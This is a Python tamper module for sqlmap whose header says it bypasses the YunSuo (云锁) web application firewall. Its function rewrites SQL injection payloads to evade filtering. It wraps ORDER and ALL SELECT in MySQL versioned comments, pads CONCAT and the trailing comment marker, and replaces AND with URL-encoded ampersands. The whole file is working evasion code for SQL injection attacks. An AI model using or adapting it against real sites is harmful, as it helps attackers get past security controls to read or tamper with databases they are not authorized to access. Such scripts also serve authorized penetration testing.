# coding=UTF-8
# Desc: sqlmap bypass 云锁 tamper
"""
Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

import re

from lib.core.data import kb
from lib.core.enums import PRIORITY
from lib.core.common import singleTimeWarnMessage
from lib.core.enums import DBMS
__priority__ = PRIORITY.LOW


def dependencies():
    pass


def tamper(payload, **kwargs):
    payload = payload.replace('ORDER', '/*!00000order*/')
    payload = payload.replace('ALL SELECT', '/*!00000all*/ /*!00000select')
    payload = payload.replace('CONCAT(', "CONCAT/**/(")
    payload = payload.replace("--", " */--")
    payload = payload.replace("AND", "%26%26")
    return payload
